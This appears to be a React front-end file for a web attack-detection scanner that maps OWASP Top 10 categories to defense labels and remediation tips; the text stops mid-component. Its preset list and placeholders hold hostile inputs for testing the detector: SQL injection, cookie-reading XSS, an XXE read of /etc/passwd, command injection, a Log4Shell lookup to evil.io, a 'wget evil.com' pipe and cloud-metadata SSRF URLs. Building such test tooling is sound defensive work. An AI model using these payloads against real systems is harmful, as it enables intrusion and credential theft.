import React, { useState } from 'react';
import {
  FiShield, FiAlertTriangle, FiCheckCircle, FiSend, FiZap,
  FiCode, FiGlobe, FiLock, FiTerminal, FiFileText, FiActivity,
  FiX, FiLoader, FiSliders, FiCpu, FiLayers, FiDatabase,
  FiCornerDownRight, FiCheck, FiAlertOctagon, FiExternalLink
} from 'react-icons/fi';
import Card from '../components/Card';
import Button from '../components/Button';
import { useNotification } from '../hooks/useNotification';
import { useTheme } from '../hooks/useTheme';
import { scanSinglePayload, scanMultiThreat } from '../services/multiThreatService';

/* ─────────────── Autonomous Defense Agents & Vector Config ─────────────── */
const CATEGORY_CONFIG = {
  // ── OWASP Top 10:2021 Core Categories ──
  'Broken Access Control': {
    owaspId: 'A01:2021',
    icon: '🔓',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    border: 'rgba(245,158,11,0.35)',
    agent: 'Auth & Access Guardian Agent',
    shieldType: 'Identity & Scope Authorization Firewall',
    defenseAction: 'Strict RBAC Enforcement & IDOR Object Scope Boundary Lock',
    remediation: 'Enforce server-side record ownership checks, deny-by-default access control, and disable debug/proxy path override headers.'
  },
  'Cryptographic Failures': {
    owaspId: 'A02:2021',
    icon: '🔐',
    color: '#3b82f6',
    bg: 'rgba(59,130,246,0.12)',
    border: 'rgba(59,130,246,0.35)',
    agent: 'CryptoGuard & Data Privacy Agent',
    shieldType: 'Cryptographic Assurance & Data Masking Shield',
    defenseAction: 'Strict Transport Security (HSTS) & Strong Cipher Suite Enforcement',
    remediation: 'Enforce HTTPS/TLS 1.3 across all endpoints, discard legacy ciphers (DES, MD5), use cryptographically secure random tokens, and mask PII/PAN.'
  },
  'Injection': {
    owaspId: 'A03:2021',
    icon: '💉',
    color: '#dc2626',
    bg: 'rgba(220,38,38,0.12)',
    border: 'rgba(220,38,38,0.35)',
    agent: 'Deep Injection Sentinel Agent',
    shieldType: 'Multi-Syntax Injection & Payload Barrier',
    defenseAction: 'Context-Aware Parser Neutralization, Prepared Parameter Binding & AST Inspection',
    remediation: 'Use parameterized queries/ORM bindings, context-aware HTML escaping, and disable OS shell invocation or external entity parsing.'
  },
  'Insecure Design': {
    owaspId: 'A04:2021',
    icon: '📐',
    color: '#eab308',
    bg: 'rgba(234,179,8,0.12)',
    border: 'rgba(234,179,8,0.35)',
    agent: 'Business Logic Armor Agent',
    shieldType: 'State Machine & Business Constraint Sentinel',
    defenseAction: 'Server-Side Invariant Validation & Financial Transaction Sanity Check',
    remediation: 'Validate all pricing, quantities, and transactional bounds on the server side; enforce strict atomic rate limits and business logic invariants.'
  },
  'Security Misconfiguration': {
    owaspId: 'A05:2021',
    icon: '⚙️',
    color: '#ea580c',
    bg: 'rgba(234,88,12,0.12)',
    border: 'rgba(234,88,12,0.35)',
    agent: 'Hardening & Surface Shield Agent',
    shieldType: 'Environment & Server Hardening Perimeter',
    defenseAction: 'Sensitive Endpoint Blackholing & Verbose Error Shielding',
    remediation: 'Disable debug modes in production, quarantine sensitive administrative actuator/status paths, and mandate custom complex credentials.'
  },
  'Vulnerable and Outdated Components': {
    owaspId: 'A06:2021',
    icon: '📦',
    color: '#9333ea',
    bg: 'rgba(147,51,234,0.12)',
    border: 'rgba(147,51,234,0.35)',
    agent: 'Supply Chain & Component Sentry',
    shieldType: 'Virtual Patching & Dependency Shield',
    defenseAction: 'Virtual Patching & Known-CVE Signature Neutralization',
    remediation: 'Maintain an updated Software Bill of Materials (SBOM), apply security patches immediately, and neutralize JNDI/OGNL expression lookup.'
  },
  'Identification and Authentication Failures': {
    owaspId: 'A07:2021',
    icon: '👤',
    color: '#be123c',
    bg: 'rgba(190,18,60,0.12)',
    border: 'rgba(190,18,60,0.35)',
    agent: 'Identity Assurance & BruteForce Sentinel',
    shieldType: 'Adaptive Identity & Authentication Armor',
    defenseAction: 'Adaptive Credential Throttling, Session Rotation & MFA Enforcement',
    remediation: 'Enforce strong password complexity, implement IP/user rate limiting, rotate session tokens on login, and mandate multi-factor authentication.'
  },
  'Software and Data Integrity Failures': {
    owaspId: 'A08:2021',
    icon: '🧩',
    color: '#4f46e5',
    bg: 'rgba(79,70,229,0.12)',
    border: 'rgba(79,70,229,0.35)',
    agent: 'Software & Data Integrity Guardian',
    shieldType: 'Integrity Verification & Deserialization Quarantine',
    defenseAction: 'Cryptographic Signature Quarantine & Safe Deserialization Filter',
    remediation: 'Do not deserialize untrusted data with native serializers, enforce cryptographic signature validation on JWTs/updates, and verify dependency checksums.'
  },
  'Security Logging and Monitoring Failures': {
    owaspId: 'A09:2021',
    icon: '📋',
    color: '#0284c7',
    bg: 'rgba(2,132,199,0.12)',
    border: 'rgba(2,132,199,0.35)',
    agent: 'Audit & Telemetry Sentry Agent',
    shieldType: 'Audit Stream Integrity & Telemetry Shield',
    defenseAction: 'Log Stream Sanitization, Scanner Blocking & Anti-Tamper Audit Lock',
    remediation: 'Sanitize all user-controlled values before logging (strip CR/LF), monitor for automated scanner signatures, and make audit tables append-only.'
  },
  'Server-Side Request Forgery (SSRF)': {
    owaspId: 'A10:2021',
    icon: '🌐',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    border: 'rgba(6,182,212,0.35)',
    agent: 'SSRF Egress Firewall Agent',
    shieldType: 'Network Egress Gateway & Protocol Shield',
    defenseAction: 'Cloud Metadata Dropper, Protocol Quarantine & RFC-1918 Private Net Dropper',
    remediation: 'Enforce strict allowlists for outbound URLs, block loopback and RFC 1918 private IP addresses, and restrict allowed protocols strictly to HTTPS.'
  },

  // ── Backward-Compatible Granular Aliases ──
  'SQL Injection': {
    owaspId: 'A03:2021',
    icon: '💉',
    color: '#e11d48',
    bg: 'rgba(225,29,72,0.12)',
    border: 'rgba(225,29,72,0.35)',
    agent: 'SQLi Deep Sentinel Agent',
    shieldType: 'Database Relational Interceptor',
    defenseAction: 'AST Query Parameterization & SQL Tautology Neutralization',
    remediation: 'Use parameterized queries, PreparedStatements, or ORM parameter binding; never concatenate untrusted strings into SQL.'
  },
  'XML / XXE Injection': {
    owaspId: 'A03:2021',
    icon: '📄',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    border: 'rgba(239,68,68,0.35)',
    agent: 'XXE Parser Barrier Agent',
    shieldType: 'XML Schema Isolation Filter',
    defenseAction: 'External Entity Resolution Disabled & DTD Quarantine',
    remediation: 'Disable external DTD resolution (disallow-doctype-decl) and general external entity processing in XML parsers.'
  },
  'Command Injection': {
    owaspId: 'A03:2021',
    icon: '💻',
    color: '#dc2626',
    bg: 'rgba(220,38,38,0.12)',
    border: 'rgba(220,38,38,0.35)',
    agent: 'OS Command Guard Agent',
    shieldType: 'Process Execution Sandbox Guard',
    defenseAction: 'Subshell & Shell Pipe Neutralization Filter',
    remediation: 'Avoid invoking OS shells (system, exec); use safe API functions with separate argument arrays (execFile).'
  },
  'Cross-Site Scripting (XSS)': {
    owaspId: 'A03:2021',
    icon: '🧨',
    color: '#f97316',
    bg: 'rgba(249,115,22,0.12)',
    border: 'rgba(249,115,22,0.35)',
    agent: 'XSS Purifier Sentinel Agent',
    shieldType: 'Client Script Context Barrier',
    defenseAction: 'Context-Aware HTML/DOM Sanitization & CSP Hardening',
    remediation: 'Contextually HTML/attribute-encode untrusted inputs and enforce a strict Content Security Policy (CSP).'
  },
  'Path Traversal': {
    owaspId: 'A01:2021',
    icon: '📂',
    color: '#8b5cf6',
    bg: 'rgba(139,92,246,0.12)',
    border: 'rgba(139,92,246,0.35)',
    agent: 'Directory Chroot Sentinel Agent',
    shieldType: 'Storage Path Traversal Shield',
    defenseAction: 'Canonical Path Boundary Enforcement & Chroot Isolation',
    remediation: 'Resolve canonical paths (realpath) and verify they remain strictly within the intended base directory.'
  },
  'SSRF': {
    owaspId: 'A10:2021',
    icon: '🌐',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    border: 'rgba(6,182,212,0.35)',
    agent: 'SSRF Egress Firewall Agent',
    shieldType: 'Network Egress Gateway Blocker',
    defenseAction: 'Cloud Metadata (169.254.x) & RFC-1918 Private Net Dropper',
    remediation: 'Enforce a domain whitelist for outbound requests, reject private IP ranges (10.x, 192.168.x, 127.x, 169.254.x).'
  },
  'LDAP Injection': {
    owaspId: 'A03:2021',
    icon: '🗂',
    color: '#10b981',
    bg: 'rgba(16,185,129,0.12)',
    border: 'rgba(16,185,129,0.35)',
    agent: 'Directory Armor Agent',
    shieldType: 'Directory Service Protocol Shield',
    defenseAction: 'LDAP Filter Sanitization & Meta-Character Neutralizer',
    remediation: 'Escape special LDAP filter characters (*, (, ), \\, NUL) and use framework-level LDAP parameterized searches.'
  },
  'Header Injection': {
    owaspId: 'A03:2021',
    icon: '📨',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    border: 'rgba(236,72,153,0.35)',
    agent: 'HTTP Header Integrity Agent',
    shieldType: 'Protocol Boundary & Stream Integrity Shield',
    defenseAction: 'CRLF Control Character Stripping & Host Whitelist Gate',
    remediation: 'Strip CR (\\r) and LF (\\n) characters from user input before writing to HTTP headers; validate the Host header.'
  },
  'Template Injection (SSTI)': {
    owaspId: 'A03:2021',
    icon: '🔧',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    border: 'rgba(168,85,247,0.35)',
    agent: 'SSTI Engine Sandbox Agent',
    shieldType: 'Template Engine Isolation Shield',
    defenseAction: 'AST Reflection Blocker & Template Sandbox Quarantine',
    remediation: 'Never pass user-supplied input directly into template render expressions; pass variables into the template context.'
  },
  'Open Redirect': {
    owaspId: 'A01:2021',
    icon: '↩',
    color: '#3b82f6',
    bg: 'rgba(59,130,246,0.12)',
    border: 'rgba(59,130,246,0.35)',
    agent: 'URL Gateway Filter Agent',
    shieldType: 'Navigation Gateway Shield',
    defenseAction: 'Strict Destination Whitelist & Protocol Boundary Verification',
    remediation: 'Enforce relative-only URL redirects or validate external targets against a strict internal domain whitelist.'
  },
  'Safe': {
    owaspId: 'Clean',
    icon: '✅',
    color: '#22c55e',
    bg: 'rgba(34,197,94,0.12)',
    border: 'rgba(34,197,94,0.35)',
    agent: 'Suraksha Autonomous Defense Grid',
    shieldType: 'Full-Stack Web Application Firewall',
    defenseAction: 'Continuous Baseline Perimeter Monitoring',
    remediation: 'Input conforms to benign web application specifications. Maintain continuous monitoring.'
  },
};

/* ─────────────── Preset payloads by OWASP Top 10 attack type ─────────────── */
const PRESETS = [
  { label: 'A01: IDOR / Forced Browsing',      icon: '🔓', payload: '/api/users/1245/invoice', category: 'Broken Access Control' },
  { label: 'A01: Privilege Escalation',         icon: '🔓', payload: 'is_admin=true&role=admin&user_id=1', category: 'Broken Access Control' },
  { label: 'A02: Cleartext HTTP Password',      icon: '🔐', payload: 'http://suraksha.local/login?password=P@ssw0rd123', category: 'Cryptographic Failures' },
  { label: 'A02: Weak Cipher Downgrade',        icon: '🔐', payload: 'cipher=DES&key_length=56', category: 'Cryptographic Failures' },
  { label: 'A03: SQLi Tautology Bypass',        icon: '💉', payload: "' OR '1'='1' --", category: 'Injection' },
  { label: 'A03: OS Command Injection',         icon: '💻', payload: '127.0.0.1; cat /etc/passwd', category: 'Injection' },
  { label: 'A03: Reflected XSS Script',         icon: '🧨', payload: '<script>alert(document.cookie)</script>', category: 'Injection' },
  { label: 'A03: XXE External Entity',          icon: '📄', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', category: 'Injection' },
  { label: 'A04: Insecure Design (Qty Refund)', icon: '📐', payload: 'quantity=-5&price=0.01', category: 'Insecure Design' },
  { label: 'A04: Unlimited OTP Abuse',          icon: '📐', payload: 'otp_attempts=unlimited&coupon=SAVE100&apply_count=999', category: 'Insecure Design' },
  { label: 'A05: Exposed .env Probe',           icon: '⚙️', payload: '/.env', category: 'Security Misconfiguration' },
  { label: 'A05: Actuator / Debug Probe',       icon: '⚙️', payload: '/actuator/health?debug=true&trace=1', category: 'Security Misconfiguration' },
  { label: 'A06: Log4Shell JNDI Injection',     icon: '📦', payload: '${jndi:ldap://evil.io/a}', category: 'Vulnerable and Outdated Components' },
  { label: 'A06: Apache Struts OGNL RCE',       icon: '📦', payload: 'Content-Type: ${struts.valueStack}', category: 'Vulnerable and Outdated Components' },
  { label: 'A07: Credential Stuffing',          icon: '👤', payload: 'admin:123456', category: 'Identification and Authentication Failures' },
  { label: 'A07: Session Fixation Injection',   icon: '👤', payload: 'JSESSIONID=FIXEDSESSION123 (set before login)', category: 'Identification and Authentication Failures' },
  { label: 'A08: Java Deserialization RCE',     icon: '🧩', payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', category: 'Software and Data Integrity Failures' },
  { label: 'A08: Unsigned JWT (alg:none)',      icon: '🧩', payload: '{"alg":"none","typ":"JWT"} ...unsigned', category: 'Software and Data Integrity Failures' },
  { label: 'A09: CRLF Log Injection',           icon: '📋', payload: 'username=admin%0aINFO: Login successful for admin', category: 'Security Logging and Monitoring Failures' },
  { label: 'A09: Scanner Signature (sqlmap)',   icon: '📋', payload: 'User-Agent: sqlmap/1.7.11#stable (http://sqlmap.org)', category: 'Security Logging and Monitoring Failures' },
  { label: 'A10: SSRF Cloud Metadata Probe',    icon: '🌐', payload: 'http://169.254.169.254/latest/meta-data/', category: 'Server-Side Request Forgery (SSRF)' },
  { label: 'A10: SSRF Internal Redis (6379)',   icon: '🌐', payload: 'http://127.0.0.1:6379/', category: 'Server-Side Request Forgery (SSRF)' },
];

/* ─────────────── Severity badge helper ─────────────── */
const SEVERITY_STYLE = {
  Critical: { bg: 'rgba(220,38,38,0.18)',  text: '#ef4444', border: 'rgba(220,38,38,0.45)' },
  High:     { bg: 'rgba(234,88,12,0.18)',  text: '#f97316', border: 'rgba(234,88,12,0.45)' },
  Medium:   { bg: 'rgba(234,179,8,0.18)',  text: '#eab308', border: 'rgba(234,179,8,0.45)' },
  Low:      { bg: 'rgba(59,130,246,0.18)', text: '#60a5fa', border: 'rgba(59,130,246,0.45)' },
  Info:     { bg: 'rgba(100,116,139,0.18)',text: '#94a3b8', border: 'rgba(100,116,139,0.45)' },
};

function SeverityBadge({ level }) {
  const s = SEVERITY_STYLE[level] || SEVERITY_STYLE.Info;
  return (
    <span style={{ backgroundColor: s.bg, color: s.text, border: `1px solid ${s.border}` }}
      className="text-[10px] font-bold uppercase px-2.5 py-0.5 rounded-full tracking-wider">
      {level}
    </span>
  );
}

/* ─────────────── Risk score meter ─────────────── */
function RiskMeter({ score }) {
  const color = score >= 75 ? '#ef4444' : score >= 50 ? '#f97316' : score >= 25 ? '#eab308' : '#22c55e';
  return (
    <div className="space-y-1.5">
      <div className="flex justify-between items-center">
        <span className="text-[10px] font-semibold text-text-muted uppercase tracking-wider">Calculated Risk Score</span>
        <span className="font-mono font-bold text-sm" style={{ color }}>{score.toFixed(1)} / 100</span>
      </div>
      <div className="h-2 rounded-full bg-border-custom overflow-hidden">
        <div
          className="h-full rounded-full transition-all duration-700 ease-out shadow-sm"
          style={{ width: `${Math.max(score, 2)}%`, backgroundColor: color }}
        />
      </div>
    </div>
  );
}

/* ─────────────── Autonomous Defense Agent Card ─────────────── */
function AgentDefenseCard({ category, found }) {
  const cfg = CATEGORY_CONFIG[category] || CATEGORY_CONFIG['Safe'];
  return (
    <div
      className={`p-3 rounded-xl border transition-all duration-300 relative overflow-hidden ${
        found ? 'ring-1 ring-red-500/50 shadow-lg' : 'hover:border-border-custom/80'
      }`}
      style={{
        backgroundColor: found ? cfg.bg : 'var(--card-bg, rgba(15,23,42,0.4))',
        borderColor: found ? cfg.border : 'var(--border-custom, #334155)',
      }}
    >
      {/* Top accent line if active */}
      {found && (
        <div
          className="absolute top-0 left-0 right-0 h-0.5 animate-pulse"
          style={{ backgroundColor: cfg.color }}
        />
      )}

      <div className="flex items-start justify-between gap-1 mb-1.5">
        <span className="text-xl">{cfg.icon}</span>
        <span
          className={`text-[9px] font-bold uppercase px-2 py-0.5 rounded-full flex items-center gap-1 border ${
            found
              ? 'bg-red-500/20 text-red-400 border-red-500/40 animate-pulse'
              : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30'
          }`}
        >
          <span
            className={`w-1.5 h-1.5 rounded-full ${
              found ? 'bg-red-400 animate-ping' : 'bg-emerald-400 animate-pulse'
            }`}
          />
          {found ? 'INTERCEPTING' : 'ACTIVE'}
        </span>
      </div>

      <div>
        <div className="flex items-center gap-1.5">
          {cfg.owaspId && (
            <span className="text-[8px] font-mono font-bold px-1 py-0.2 rounded bg-white/10 text-text-muted border border-white/15">
              {cfg.owaspId}
            </span>
          )}
          <p className="text-[11px] font-bold truncate" style={{ color: found ? cfg.color : 'var(--text-custom, #f1f5f9)' }}>
            {category}
          </p>
        </div>
        <p className="text-[9px] text-text-muted truncate mt-0.5 font-medium">
          {cfg.agent}
        </p>
      </div>

      <div className="mt-2 pt-2 border-t border-border-custom/40 flex items-center justify-between text-[9px]">
        <span className="text-text-muted truncate max-w-[110px]" title={cfg.defenseAction}>
          {cfg.shieldType}
        </span>
        <span style={{ color: found ? cfg.color : '#10b981' }} className="font-semibold">
          {found ? '⚠ THREAT' : '✓ CLEAN'}
        </span>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   MAIN PAGE COMPONENT
═══════════════════════════════════════════════════════════ */
const MultiThreatScanner = () => {
  const { showNotification } = useNotification();
  const { isDark } = useTheme();

  const [scanMode, setScanMode] = useState('payload'); // 'payload' | 'request'
  const [isScanning, setIsScanning] = useState(false);
  const [result, setResult] = useState(null);

  /* Single payload mode */
  const [rawPayload, setRawPayload] = useState('');

  /* Full request mode */
  const [reqUrl, setReqUrl]           = useState('');
  const [reqMethod, setReqMethod]     = useState('GET');
  const [reqHeaders, setReqHeaders]   = useState('');
  const [reqParams, setReqParams]     = useState('');
  const [reqBody, setReqBody]         = useState('');
  const [reqCookies, setReqCookies]   = useState('');

  const allCategories = Object.keys(CATEGORY_CONFIG).filter(k => k !== 'Safe');

  const applyPreset = (preset) => {
    setRawPayload(preset.payload);
    setScanMode('payload');
    showNotification(`Loaded preset: ${preset.label}`, 'info');
  };

  const parseFlatKV = (text) => {
    if (!text.trim()) return {};
    const out = {};
    text.split('\n').forEach(line => {
      const idx = line.indexOf(':');
      if (idx > 0) {
        out[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
      }
    });
    return out;
  };

  const handleScan = async () => {
    if (scanMode === 'payload' && !rawPayload.trim()) {
      showNotification('Enter a payload string to scan.', 'warning');
      return;
    }
    if (scanMode === 'request' && !reqUrl.trim() && !reqBody.trim() && !reqParams.trim()) {
      showNotification('Provide at least a URL, parameters, or body to scan.', 'warning');
      return;
    }

    setIsScanning(true);
    setResult(null);

    try {
      let res;
      if (scanMode === 'payload') {
        res = await scanSinglePayload(rawPayload.trim());
      } else {
        res = await scanMultiThreat({
          url:        reqUrl,
          method:     reqMethod,
          headers:    parseFlatKV(reqHeaders),
          parameters: parseFlatKV(reqParams),
          cookies:    parseFlatKV(reqCookies),
          body:       reqBody,
        });
      }

      const responseData = res.data || res;
      setResult(responseData);
      const blocked = responseData?.blocked ?? responseData?.Blocked ?? false;
      const primary = responseData?.attack_category || responseData?.['Attack Category'] || 'Threat';
      const agent = responseData?.defense_agent || responseData?.['Defense Agent'] || 'Autonomous Defense Agent';

      if (blocked) {
        showNotification(`⚠ ${primary} neutralized by ${agent}!`, 'error');
      } else {
        showNotification('✓ Traffic verified clean across all 11 defense vectors.', 'success');
      }
    } catch (err) {
      console.error(err);
      showNotification('Scan failed — check backend connectivity.', 'error');
    } finally {
      setIsScanning(false);
    }
  };

  const detected = result
    ? (result.categories_found || result['Categories Found'] || {})
    : {};

  const primaryCat     = result?.attack_category || result?.['Attack Category'] || 'Safe';
  const riskScore      = result?.risk_score       ?? result?.['Risk Score']       ?? 0;
  const severity       = result?.severity         || result?.['Severity']         || 'Info';
  const blocked        = result?.blocked          ?? result?.['Blocked']          ?? false;
  const explanation    = result?.explanation      || result?.['Explanation']      || '';
  const matches        = result?.matches          || result?.all_matches          || result?.['Matches'] || [];
  const catCfg         = CATEGORY_CONFIG[primaryCat] || CATEGORY_CONFIG['Safe'];
  const defenseAgent   = result?.defense_agent    || result?.['Defense Agent']    || catCfg.agent;
  const defenseAction  = result?.defense_action   || result?.['Defense Action']   || catCfg.defenseAction;
  const shieldType     = result?.shield_type      || result?.['Shield Type']      || catCfg.shieldType;

  return (
    <div className="space-y-6">

      {/* ── Page Header ── */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h2 className="text-[22px] font-bold tracking-tight text-text-custom leading-tight flex items-center gap-2">
            <FiShield className="text-indigo-400" />
            Autonomous Multi-Threat Defense Grid
          </h2>
          <p className="text-[12px] text-text-muted mt-1 max-w-2xl">
            11 Specialized AI Defense Agents actively protecting web applications against SQL Injection,
            Broken Access Control, XXE, OS Command Injection, XSS, SSRF, Path Traversal, and OWASP Top-10 vectors in real time.
          </p>
        </div>
        <div className="flex flex-wrap items-center gap-2 text-[10px] font-semibold">
          <span className="px-2.5 py-1 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/25 flex items-center gap-1.5">
            <FiCpu className="w-3.5 h-3.5" />
            11 AI AGENTS ONLINE
          </span>
          <span className="px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/25 flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse inline-block" />
            REAL-TIME SHIELD ARMED
          </span>
        </div>
      </div>

      {/* ── 11 Autonomous Defense Agent Cards ── */}
      <div>
        <div className="flex items-center justify-between mb-2">
          <p className="text-[11px] font-bold text-text-muted uppercase tracking-wider flex items-center gap-1.5">
            <FiLayers className="w-3.5 h-3.5 text-indigo-400" />
            Autonomous Agent Defense Matrix ({allCategories.length} Active Sentinels)
          </p>
          <span className="text-[10px] text-text-muted">
            Continuous Heuristic & Behavioral Protection
          </span>
        </div>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2.5">
          {allCategories.map(cat => (
            <AgentDefenseCard
              key={cat}
              category={cat}
              found={!!detected[cat]}
            />
          ))}
        </div>
      </div>

      {/* ── Attack Preset Library ── */}
      <Card
        title="Attack Vector & Payload Presets"
        subtitle="Click any preset payload to test corresponding AI Defense Agent interception in real time"
      >
        <div className="flex flex-wrap gap-2 mt-1">
          {PRESETS.map((p) => (
            <button
              key={p.label}
              onClick={() => applyPreset(p)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-border-custom
                text-[11px] font-medium text-text-muted hover:text-text-custom
                hover:border-indigo-500/60 hover:bg-indigo-500/10 transition-all cursor-pointer"
            >
              <span>{p.icon}</span>
              <span>{p.label}</span>
            </button>
          ))}
        </div>
      </Card>

      {/* ── Scan Panel: Configuration (Left) & Threat Analysis (Right) ── */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">

        {/* Left Column: Scanner Configuration */}
        <div className="lg:col-span-1 space-y-4">
          <Card title="Scanner Configuration" subtitle="Select scan mode and enter payload">
            <div className="space-y-4 text-xs">

              {/* Mode Toggle */}
              <div>
                <label className="text-[10px] font-semibold text-text-muted uppercase block mb-2 tracking-wider">
                  Scan Mode
                </label>
                <div className="grid grid-cols-2 gap-2">
                  {[
                    { key: 'payload', label: 'Single Payload', icon: <FiCode /> },
                    { key: 'request', label: 'Full Request',   icon: <FiGlobe /> },
                  ].map(m => (
                    <button
                      key={m.key}
                      onClick={() => setScanMode(m.key)}
                      className={`flex items-center justify-center gap-1.5 py-2 rounded-lg border text-[11px] font-semibold transition-all cursor-pointer ${
                        scanMode === m.key
                          ? 'border-indigo-500 bg-indigo-500/15 text-indigo-400 shadow-sm'
                          : 'border-border-custom text-text-muted hover:border-border-custom/80'
                      }`}
                    >
                      {m.icon} {m.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Single Payload Input */}
              {scanMode === 'payload' && (
                <div>
                  <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1.5 tracking-wider">
                    Raw Payload String
                  </label>
                  <textarea
                    value={rawPayload}
                    onChange={e => setRawPayload(e.target.value)}
                    rows={6}
                    className="w-full px-3 py-2.5 bg-bg-custom border border-border-custom rounded-lg
                      font-mono text-[11px] text-red-400 focus:outline-none focus:border-indigo-500 resize-none"
                    placeholder={`e.g.  ' OR '1'='1' --\nor:   <script>alert(1)</script>\nor:   ../../../../etc/passwd\nor:   ; ls -la | wget evil.com`}
                  />
                </div>
              )}

              {/* Full Request Inputs */}
              {scanMode === 'request' && (
                <div className="space-y-3">
                  <div className="flex gap-2">
                    <div className="flex-1">
                      <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">Target URL</label>
                      <input
                        value={reqUrl}
                        onChange={e => setReqUrl(e.target.value)}
                        placeholder="https://target.com/api/user?id=1"
                        className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500"
                      />
                    </div>
                    <div className="w-24">
                      <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">Method</label>
                      <select
                        value={reqMethod}
                        onChange={e => setReqMethod(e.target.value)}
                        className="w-full px-2 py-2 bg-bg-custom border border-border-custom rounded-lg text-[11px] text-text-custom focus:outline-none"
                      >
                        {['GET','POST','PUT','DELETE','PATCH'].map(m => <option key={m}>{m}</option>)}
                      </select>
                    </div>
                  </div>
                  <div>
                    <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">
                      Query Parameters (key: value)
                    </label>
                    <textarea rows={2} value={reqParams} onChange={e => setReqParams(e.target.value)}
                      placeholder={"user_id: 1\nredirect: http://evil.com"}
                      className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                    />
                  </div>
                  <div>
                    <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">
                      HTTP Headers (key: value)
                    </label>
                    <textarea rows={2} value={reqHeaders} onChange={e => setReqHeaders(e.target.value)}
                      placeholder={"X-Forwarded-For: 127.0.0.1\nHost: evil.com"}
                      className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                    />
                  </div>
                  <div>
                    <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">
                      Request Body
                    </label>
                    <textarea rows={3} value={reqBody} onChange={e => setReqBody(e.target.value)}
                      placeholder={'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}
                      className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-red-400 focus:outline-none focus:border-indigo-500 resize-none"
                    />
                  </div>
                  <div>
                    <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">
                      Cookies (key: value)
                    </label>
                    <textarea rows={2} value={reqCookies} onChange={e => setReqCookies(e.target.value)}
                      placeholder={"session: abc123\nrole: admin"}
                      className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                    />
                  </div>
                </div>
              )}

              <Button
                variant="primary"
                onClick={handleScan}
                disabled={isScanning}
                isLoading={isScanning}
                className="w-full justify-center text-xs py-2.5 font-bold uppercase tracking-wider cursor-pointer"
                icon={isScanning ? FiLoader : FiZap}
              >
                {isScanning ? 'Interception Engines Scanning...' : 'Run Multi-Threat Agent Scan'}
              </Button>
            </div>
          </Card>
        </div>

        {/* Right Column: Threat Analysis & Agent Telemetry */}
        <div className="lg:col-span-2 space-y-4">
          <Card
            title="Threat Analysis & Agent Telemetry"
            subtitle="Autonomous AI agent classification and real-time mitigation telemetry"
          >
            {/* Idle State */}
            {!result && !isScanning && (
              <div className="py-20 flex flex-col items-center justify-center text-center space-y-3">
                <div className="p-4 rounded-2xl bg-indigo-500/10 border border-indigo-500/20">
                  <FiShield className="w-12 h-12 text-indigo-400" />
                </div>
                <p className="text-sm font-bold text-text-custom">Autonomous Defense Grid Armed</p>
                <p className="text-xs text-text-muted max-w-md">
                  Select an attack vector from the <strong>Attack Preset Library</strong> above or enter a custom payload string, then click <strong>Run Multi-Threat Agent Scan</strong> to observe real-time agent defense.
                </p>
              </div>
            )}

            {/* Scanning State */}
            {isScanning && (
              <div className="py-20 flex flex-col items-center justify-center text-center space-y-3">
                <div className="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin" />
                <p className="text-sm font-bold text-indigo-400">Engaging Autonomous Multi-Threat Sentinels...</p>
                <p className="text-xs text-text-muted">Analyzing AST structure, heuristic signatures, and input semantics...</p>
              </div>
            )}

            {/* Result State */}
            {result && !isScanning && (
              <div className="space-y-4">

                {/* 1. Hero Interception Banner */}
                <div
                  className="p-4 rounded-xl border flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 shadow-md"
                  style={{
                    backgroundColor: catCfg.bg,
                    borderColor: catCfg.border,
                  }}
                >
                  <div className="flex items-center gap-3">
                    <span className="text-3xl">{catCfg.icon}</span>
                    <div>
                      <div className="flex items-center gap-2">
                        {catCfg.owaspId && catCfg.owaspId !== 'Clean' && (
                          <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-white/10 text-text-muted border border-white/20">
                            {catCfg.owaspId}
                          </span>
                        )}
                        <span className="text-[10px] font-bold uppercase tracking-wider text-text-muted">
                          Identified Threat Class
                        </span>
                        <SeverityBadge level={severity} />
                      </div>
                      <p className="text-lg font-black tracking-tight" style={{ color: catCfg.color }}>
                        {primaryCat}
                      </p>
                      <p className="text-[11px] text-text-muted flex items-center gap-1.5 mt-0.5">
